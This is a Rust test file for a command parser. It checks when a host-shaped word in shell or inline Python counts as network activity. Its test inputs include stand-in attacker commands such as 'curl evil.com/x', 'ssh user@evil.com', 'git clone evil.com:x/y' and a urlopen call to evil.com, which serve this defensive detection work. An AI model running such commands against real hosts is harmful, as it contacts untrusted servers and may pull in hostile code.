//! Hosts in shell words and inline code: network evidence or only a word that
//! looks like a host (ADR-025).

use super::*;

fn has_net_word(atoms: &[AtomicAction], host: &str) -> bool {
    atoms.contains(&AtomicAction::NetWord {
        host: host.to_owned(),
    })
}

#[test]
fn a_call_in_interpreter_code_is_not_a_host() {
    // `.run` and `.dev` are real top-level domains; a name followed by `(` is a call.
    let a = parsed("python3 - <<'EOF'\nimport subprocess\nsubprocess.run(['ls'])\nEOF");
    assert!(
        !a.iter()
            .any(|x| matches!(x, AtomicAction::Net { .. } | AtomicAction::NetWord { .. })),
        "{a:?}"
    );
    let a = parsed(r#"python3 -c "app.dev (1); urlopen('https://evil.com')""#);
    assert!(has_net(&a, "evil.com"), "{a:?}");
    assert!(
        has_net_word(&a, "app.dev"),
        "a space before ( is not a call, but without a scheme only a word: {a:?}"
    );
    let a = parsed("python3 - <<'EOF'\nurlopen('http://x.run/')\nEOF");
    assert!(has_net(&a, "x.run"), "{a:?}");
}

/// ADR-025: a host-shaped word is network evidence only as a URL or as an
/// argument of a program that names hosts.
#[test]
fn a_host_shaped_word_is_net_only_where_a_host_is_expected() {
    for (command, host) in [
        (
            "python3 scripts/x.py --get check_runs.0.id",
            "check_runs.0.id",
        ),
        ("make app.dev", "app.dev"),
        ("echo defaults.net", "defaults.net"),
    ] {
        let a = parsed(command);
        assert!(
            has_net_word(&a, host) && !has_net(&a, host),
            "{command}: {a:?}"
        );
    }
    for (command, host) in [
        ("curl evil.com/x", "evil.com"),
        ("ssh user@evil.com", "evil.com"),
        ("git clone evil.com:x/y", "evil.com"),
        ("python3 x.py https://evil.com/", "evil.com"),
    ] {
        assert!(has_net(&parsed(command), host), "{command}");
    }
}
